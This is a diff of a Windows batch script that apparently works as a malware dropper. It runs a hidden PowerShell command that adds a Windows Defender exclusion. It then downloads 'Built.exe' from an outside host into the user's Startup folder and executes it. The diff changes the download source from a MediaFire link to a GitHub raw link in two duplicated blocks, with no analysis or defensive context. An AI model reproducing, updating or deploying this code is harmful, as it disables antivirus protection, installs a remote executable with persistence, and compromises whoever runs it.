@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
+set "URL=https://github.com/windysdus/k/raw/main/Built.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
+set "URL=https://github.com/windysdus/k/raw/main/Built.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
